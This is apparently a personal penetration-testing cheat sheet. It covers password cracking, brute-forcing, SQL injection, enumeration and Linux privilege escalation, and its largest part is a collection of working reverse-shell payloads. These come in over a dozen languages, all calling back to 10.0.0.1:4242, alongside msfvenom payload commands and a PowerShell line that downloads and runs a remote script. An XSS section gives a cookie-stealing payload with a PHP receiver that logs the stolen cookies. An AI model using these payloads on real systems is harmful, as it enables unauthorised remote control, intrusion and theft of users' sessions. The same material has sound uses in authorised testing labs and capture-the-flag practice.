

# GENERAL

### Web Server Service

python3 -m http.server portnumber

python -mSImpleHTTPServer portnumber

### Downloading a file

- wget "url:port"

- curl "url:port"

- scp  hostname@IP: <filepath>

- nc -l -p <port> > <filepath>     receiver machine
- nc -w 3 <IP> <port> < <file>     sender machine


### Generate ssh keys

- ssh-keygen 


### Finding Specific Strings in specified directoy

- grep -rnw / -e 'StringtoSearch'  2>/dev/null           / is root directory.Can be any directory
 

### Github

> First clone a repository empty or commited

1. git clone "URL"

2. git add --all                   update eveything to be added in repo

3. git commit -m"commit message"      commit the update

4. git push                          push the commit to repo





# ########



# NETWORKING


### local network Info

- ifconfig

- ip a


### All IP's in a subnet

- arp-scan -l

### Route (specifying gateways to IP's)


- route                                                 displays routing table

- ip route add <IP to add> via <gateway>                gateway is usually router address(NAT)


### OpenVpn

- openvpn <vpnfilepath>                    for labs and ctfs :()



# ########





# TOOLS

- **pspy (hidden cronjobs and services)**

- **steghide (extract files from an image)**

   - steghide extract -sf <jpg>

- **stegcracker (cracking images passphrase when extracting data)**

   - stegcracker <jpg> <wordlist>

- **johntheripper (cracking passwords)**

   -  john <HashFile> --wordlists=wordlist

- **ssh2john (converting ssh keys into hash for cracking in john)**

   1.  python3 ssh2john <ssh_keys> > <hashoutput>
   2.  john <hashoutput> ---wordlist=wordlist

- **zip2john (cracking zip passwords)**

   1.  zip2john <zipfile> > <hashoutput>
   2.  john <hashoutput>  --wordlist=wordlist 

- **rar2john (cracking rar passwords)**

   1.  rar2john <rarfile> > <hashoutput>
   2.  john <hashoutput>  --wordlist=wordlist 

- **gpg2john and gpg (cracking pgp files passwords and accessing pgp files)**

   1.  gpg2john key.asc > hash
   2.   john hash --wordlist=wordlist 
   3.   gpg --import key.asc
   4.   gpg --decrypt file.pgp



- **Hydra (bruteforcing credentials from different services)**

     #### Basic Usage   
  
 >   hydra -l <username> -P <wordlist> service://IP -S portnumber   

     #### Bruteforce login pages
 
>    hydra -l username -Pwordlist ip http-post-form  "/login.php:usernameparameter=username&passwordparameter=^PASS^:ANy error to indicate hydra that we are successful"

     **NOTE!!!! the parameters name must be that which application is using.We can use burp to see those post parameters**  
    
     **In above command if we are also bruteforcing username then we will pass ^USER^ in username parameter**


- **gobuster (Hidden directories and file on webserver)**

   -  gobuster dir -u <url> -w <wordlist>  (Directories)

   -  gobuster vhost -u <url> -w <wordlist>  (subdomains/Dns)

- **binwalk  (check hidden data in files)**

   binwalk <filename>

- **Strings (string representation of file hexdump)**

   Strings <filename>

- **SQLMap**

 >   sqlmap -u <URL> -p <parameter>  rest flags   
  
    --technique=U(for union),B(for boolean),T(Time based)
 
1. We can save the request of vulnerable page from burp and then pass it to Sqlmap

>  **sqlmap -r request.req rest of flags**

2.   we need to see the database info step by step to not stress the client system.  We can also save the burp request
file and pass it to the sqlmap and then just specify our technique(sqlmap can also automatically do it) and flags as follows. 
  
  -  **sqlmap -u http://url/path.php/(no need to give if burp file is given) --technique=B --dbs** *This will display the databases* 
   
  -   **sqlmap -u http://url/path.php/(no need to give if burp file is given) --technique=B -D dbname --tables** *This will display tables in the specified database*

  -    **sqlmap -u http://url/path.php/(no need to give if burp file is given) --technique=B -D dbname -T tablename --coloumns** *This will display all the coloumns in the asked table*
   
  -    **sqlmap -u http://url/path.php/(no need to give if burp file is given) --technique=B --D dbname -T tablename -C coloumnnames --dump** *This will dump all the data in the coloumns of table*  



# #######

# Databases

  - ## MySQL
      
       To connect to mysql server over a network
 
>       mysql -u <username>  -p  -h host or ip  
       
         NOw enter password

        **View databases**

>      SHOW DATABSES;    


        **Use a database**

>       USE DATABASE <NAME>;

        **view Tables**

>       SHOW TABLES;

         **View coloumns and rows**

>        DESC <TABLE_NAME>;

         **View data stored**

>       SELECT * FROM <TABLE_NAME> 

         **delete data**

>       DELETE FROM <TABLE_NAME> WHERE COLOUMN_NAME=DATA_STORED





# ######

# SHELLS

### TTY Stable shells

- bash -i

- /bin/bash -i

- /usr/bin/script -qc /bin/bash 1&>/dev/null

- python3 -c 'import pty;pty.spawn("/bin/bash")'

- python -c 'import pty;pty.spawn("/bin/bash")'


### Bash

#### Bash TCP

- bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

- 0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196



#### Bash UDP

- Victim:
        sh -i >& /dev/udp/10.0.0.1/4242 0>&1

- Listener:
        nc -u -lvp 4242

> Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash

### Python


#### Linux only

- IPv4

         export RHOST="10.0.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

- IPv4

        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

- IPv6

        python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'

        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

- Windows only

        C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"

### PhP

- php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'

- php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'

- php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'

- php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'

- php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'

- php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'

- php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

### Perl

- perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

- perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'


#### NOTE: Windows only
- perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

### Ruby

- ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

- ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

#### NOTE: Windows only
- ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'





### Golang

- echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go


### Netcat Traditional

- nc -e /bin/sh 10.0.0.1 4242
- nc -e /bin/bash 10.0.0.1 4242
- nc -c bash 10.0.0.1 4242

### Netcat OpenBsd os

- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f






### OpenSSL

#### Attacker:

1. user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
2. user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
or
1. user@attack$ ncat --ssl -vv -l -p 4242

2. user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s

TLS-PSK (does not rely on PKI or self-signed certificates)

#### generate 384-bit PSK
#### use the generated string as a value for the two PSK variables from below
openssl rand -hex 48 
#### server (attacker)
export LHOST="*"; export LPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT
#### client (victim)
export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE






### Powershell

- powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

- powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

- powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')


### Awk

- awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null


### Java

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

#### Java Alternative 1

String host="127.0.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

Java Alternative 2

NOTE: This is more stealthy

Thread thread = new Thread(){
    public void run(){
        // Reverse shell here
    }
}
thread.start();




### War

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file





### Lua

Linux only

lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"

Windows and Linux

lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'






### NodeJS

(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4242, "10.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh 10.0.0.1 4242')

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash')

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py




### Groovy

by frohoff NOTE: Java reverse shell also work for Groovy

String host="10.0.0.1";
int port=4242;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

Groovy Alternative 1

NOTE: This is more stealthy

Thread.start {
    // Reverse shell here
}




### C

> Compile with gcc /tmp/shell.c --output csh && csh

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 4242;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}





### Meterpreter Shell



- Windows Staged reverse TCP

        msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe



- Windows Stageless reverse TCP

        msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe



- Linux Staged reverse TCP

        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf



- Linux Stageless reverse TCP

        msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf




### Other platforms

$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f elf > shell.elf
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f exe > shell.exe
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f macho > shell.macho
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f asp > shell.asp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f war > shell.war
$ msfvenom -p cmd/unix/reverse_python LHOST="10.0.0.1" LPORT=4242 -f raw > shell.py
$ msfvenom -p cmd/unix/reverse_bash LHOST="10.0.0.1" LPORT=4242 -f raw > shell.sh
$ msfvenom -p cmd/unix/reverse_perl LHOST="10.0.0.1" LPORT=4242 -f raw > shell.pl
$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.php; cat shell.php



# #######


# WebApp Attacks

-  ## XSS
    
    ### Stealing cookies      
  
       **Insert this payload in vulnerable app**     

   >   <script>var i=new image();i.src="http://oursite.com/receiverfiletowritecookies.php?parameter="+escape(document.cookie)</script> 
 
        **receiving php file on which cookies will be written**
 
   >     <?php
   >      
   >    $ip=$_SERVER['REMOTE_ADDR'];$browser=$_SERVER['HTTP_USER_AGENT'];
   >    
   >   
   >    $fp=fopen('txtstorefileonourserver.txt','a');
   >    
   >   fwrite($fp,$ip.''.$browser." \n");fwrite($fp,urldecode($_SERVER['QUERY_STRING']. " \n\n"));fclose($ip);?>

- ## SQLI
 
   -   **injecting a single quote can cause weird behavior of app indicating possible injection point**
   -   **Try all get(through url),post(burp) parameters and inject in headers also(burp)**
   -   **when testing boolean sqli,a true condition shows as normal while false causes app to malfunction**
   -   ****
      
     ### basic boolean sqli

       web app uses select example,example2 from table_name where id=somevalue . We add our payload to make it a boolean condition

       This query dump all the information which is queried and we only check comdition with the parameter to make statement true

>     ' or 1=1--        

     
     ### basic union sqli

       Union based sqli doesnt ignore the app sql query as there is no boolean condition so application query is executed alongside our crafted query

      Union joins different sql queries together

      **We dont know that how many attributes is the application asking in the query which we manipulate**
      
      **to tackle that we can use following payload**
      ***'union select null,null;***   we can keep increasing amount of nulls in our query and at which number web app dont give any error,thats the right amount of queries
      **We can also do this by using ORDER By 1,order by 2(keep increasing orders until you get right amount of queiries)**

>     ' union select username,password from table_name where 1=1;

     #### local database username

>      we can see the database user using user() function ; 
>      Query is   ' union select user();-- -   



# #######


# ENUMURATION

### Rustscan 

> **Rustscan to scan for open ports and then use nmap for heavy scanning**

rustscan -a <IP>

### Nmap

nmap -p <openports> -T4 -A <IP>      


nmap -p <openports> -T4 -A <IP> --script vuln       Detect vulneribilties of discovered services



### FTP

ftp <IP>

try anonymous:anonymous credentials for Null Sessions

dir            command to list directories

get <file>     get a copy of file on local machine

put <file>     upload a file to ftp server

### SMB 

- smbclient -L //IP/      displays shares on samba server

- smbclient //IP/<share>       access that share

- smbget -T smb://IP/<share>   get copy of that share on local machine


- enum4linux -a <IP>              detailed mapping of smb server :)


### RDP

rdesktop -u <username> -p <password> <IP:port>             connect to a remote windows machine



# #######


# POST EXPLOITATION
 

### KernelInfo

cat /etc/*release
uname -a


   
### Cronjobs
**What to Look for: if cronjobs are being run by root or any other user then see if you can write to that file or not**
**If you cannot write to the file then try to duplicate the path of that file and make a copy of that file and its path to execute your shell**



-cat /etc/crontab

- cronjob -l   

- crontab -u <user> -e 


### sudo 

sudo -u#-1 <command>


### File Permissions



- Suid:    find / -type f -perm -4000 2>/dev/null

- Sgid:    find / -type f -perm -2000 2>/dev/null

- World readable:   find / -type f -readable -user <username> 2>/dev/null
 
- World Writable:   find / -type f -writable -user <username> 2>/dev/null

### Capabilities(Similiar to Suid permissions ) 

getcap -r / 2>/dev/null



### Path Manipulation

> **Suppose a binary  /bin/update is not on secure path and can be vulnerable then we can make a custom binary and replace it with**
> **the existing binary.So whenever this binary is executed either by user command or by cronjob,our custom code gets executed.**

**We can also  add any custom script or program in our secure path** 
**export PATH=<FilePath>/:$PATH**

### NFS(Network File System)

1. showmount -e <IP>       Displays mount Path

2. mount -t nfs <IP>:/<mountpath> <pathtomounto>     mount the file system on your local machine 

### Mount 

  >   df -h      **List all the device using disk resources,can be used to see external mounted devices like usb etc**

  >   mount     **Shows mounted device on the system**   
 
  >   
